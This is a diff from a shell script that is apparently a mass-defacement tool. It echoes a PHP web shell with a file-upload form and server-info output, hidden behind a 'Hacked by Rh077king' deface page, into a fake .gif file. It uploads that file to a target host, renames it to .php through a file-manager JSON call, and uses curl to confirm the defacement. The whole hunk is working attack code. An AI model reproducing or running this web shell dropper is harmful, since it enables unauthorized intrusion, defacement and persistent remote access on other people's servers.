@@ -71,7 +71,7 @@ rand=`date +%s | sha256sum | base64 | head -c 6 ; echo`
 echo "<?php if(isset(\$_GET[\"$rand\"])){echo\"<font color=#FFFFFF>[uname]\".php_uname().\"[/uname]\";echo \"<br>\";print \"\n\";if(@ini_get(\"disable_functions\")){echo \"DisablePHP=\".@ini_get(\"disable_functions\");}else{ echo \"Disable PHP = NONE\";}echo \"<br>\";print \"\n\";if(@ini_get(\"safe_mode\")){echo \"Safe Mode = ON\";}else{ echo \"Safe Mode = OFF\";} echo \"<br>\";print "\n";echo\"<form method=post enctype=multipart/form-data>\";echo\"<input type=file name=f><input name=v type=submit id=v value=up><br>\";if(\$_POST[\"v\"]==up){if(@copy(\$_FILES[\"f\"][\"tmp_name\"],\$_FILES[\"f\"][\"name\"])){echo\"<b>Yup Man :D </b>-->\".\$_FILES[\"f\"][\"name\"];}else{echo\"<b>Fuck :| \";}}}?> <html><head><title>- Hacked by Rh077king -</title></head><center><body background=\"https://a.top4top.io/p_2027l5ooo0.gif\"><br><img src=\"https://b.top4top.io/p_2008f68fl0.jpeg\"><br><br><font size=\"+1\" color=\"red\"> ./Ghashghayi <font size=\"+1\" color=\"white\"> Hacker <br> <font size=\"+1\" color=\"white\"> Rh077king is here dear Admin fixed you're vulnerability <br><font size=\"+1\" font color=\"red\">Cyber king squad <font color=\"white\"> Wase Here ... <br><img src=\"hhttps://b.top4top.io/p_2008f68fl0.jpeg\"></center></body></html><!-- <?php echo md5(behnam); ?> --> " > Rh077king.gif
 
 UploadRh077king ${HOSTX}${DIR}  $1
-Json2 "${HOSTX}${DIR}" "json={\"fn\":\"folderRename\",\"args\":[\"${1}Rh077king.gif\",\"vanda.php\"]}"
+Json2 "${HOSTX}${DIR}" "json={\"fn\":\"folderRename\",\"args\":[\"${1}Rh077king.gif\",\"Rh077king.php\"]}"
 
 
 curl --silent --max-time 10 --connect-timeout 10 -A "Mozilla/5.0" "http://${HOSTX}${DIR}/${2}/Rh077king.php"  | grep -i "Hacked" >/dev/null;gck1=$?
